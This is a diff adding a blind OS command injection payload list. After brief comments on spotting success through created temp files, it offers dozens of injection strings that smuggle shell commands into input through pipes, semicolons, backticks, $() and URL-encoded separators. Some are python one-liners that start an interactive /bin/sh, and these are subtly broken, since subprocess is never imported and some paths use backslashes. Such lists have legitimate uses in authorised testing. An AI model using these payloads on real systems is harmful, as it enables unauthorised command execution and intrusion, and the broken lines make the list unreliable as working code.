@@ -1,0 +1,60 @@
+# This are blind OS command injection, meaning that no data or information will return
+# with the injection response to indicate the command was run. 
+# These require shell access to the system. Look for a file created with temp0*
+# this will tell you which command was successful, the file owner will tell you 
+# the privilege level of the running process. 
+|touch temp001||`touch temp002` #&apos; |touch temp003||`touch temp004` 
+|touch temp006
+|`touch temp007'
+||`touch temp008` #\&quot; 
+||`touch temp009`
+#&apos; |touch temp010
+&touch temp011
+&`touch temp012`
+&&`touch temp013`
+|`touch temp014`
+'`touch temp015`'
+;touch temp016
+;`touch temp017`
+$(touch temp018)
+@{[system "touch temp019”]}
+#\&quot; |touch temp020
+;python -c 'import os;os.mknod("temp021");p=subprocess.call(["/bin/sh","-i"]);'&
+&python -c 'import os;os.mknod("temp022");p=subprocess.call(["/bin/sh","-i"]);'&
+|python -c 'import os;os.mknod("temp023");p=subprocess.call(["/bin/sh","-i"]);'&
+&&python -c 'import os;os.mknod("temp024");p=subprocess.call(["/bin/sh","-i"]);'&
+||python -c 'import os;os.mknod("temp025");p=subprocess.call(["/bin/sh","-i"]);'&
+%0Dpython -c 'import os;os.mknod("temp026");p=subprocess.call(["/bin/sh","-i"]);'&
+%26python -c 'import os;os.mknod("temp027");p=subprocess.call(["/bin/sh","-i"]);'&
+%7cpython -c 'import os;os.mknod("temp028");p=subprocess.call(["/bin/sh","-i"]);'&
+%3bpython -c 'import os;os.mknod("temp029");p=subprocess.call(["/bin/sh","-i"]);'&
+;python -c 'import os;os.mknod("temp030");p=subprocess.call(["/bin/sh","-i"]);'&
+
+# In some cases, the processes might not have access to write to the the directory,
+# so see if it can write into the tmp directory; check there for a temp0* file creation
+|touch \tmp\temp001||`touch \tmp\temp002` #&apos; |touch \tmp\temp003||`touch \tmp\temp004` 
+|touch \tmp\temp006
+|`touch \tmp\temp007'
+||`touch \tmp\temp008` #\&quot; 
+||`touch \tmp\temp009`
+#&apos; |touch \tmp\temp010
+&touch \tmp\temp011
+&`touch \tmp\temp012`
+&&`touch \tmp\temp013`
+|`touch \tmp\temp014`
+'`touch \tmp\temp015`'
+;touch \tmp\temp016
+;`touch \tmp\temp017`
+$(touch \tmp\temp018)
+@{[system "touch \tmp\temp019”]}
+#\&quot; |touch \tmp\temp020
+;python -c 'import os;os.mknod("\tmp\temp021");p=subprocess.call(["/bin/sh","-i"]);'&
+&python -c 'import os;os.mknod("\tmp\temp022");p=subprocess.call(["/bin/sh","-i"]);'&
+|python -c 'import os;os.mknod("\tmp\temp023");p=subprocess.call(["/bin/sh","-i"]);'&
+&&python -c 'import os;os.mknod("\tmp\temp024");p=subprocess.call(["/bin/sh","-i"]);'&
+||python -c 'import os;os.mknod("\tmp\temp025");p=subprocess.call(["/bin/sh","-i"]);'&
+%0Dpython -c 'import os;os.mknod("\tmp\temp026");p=subprocess.call(["/bin/sh","-i"]);'&
+%26python -c 'import os;os.mknod("\tmp\temp027");p=subprocess.call(["/bin/sh","-i"]);'&
+%7cpython -c 'import os;os.mknod("\tmp\temp028");p=subprocess.call(["/bin/sh","-i"]);'&
+%3bpython -c 'import os;os.mknod("\tmp\temp029");p=subprocess.call(["/bin/sh","-i"]);'&
+;python -c 'import os;os.mknod("\tmp\temp030");p=subprocess.call(["/bin/sh","-i"]);'&
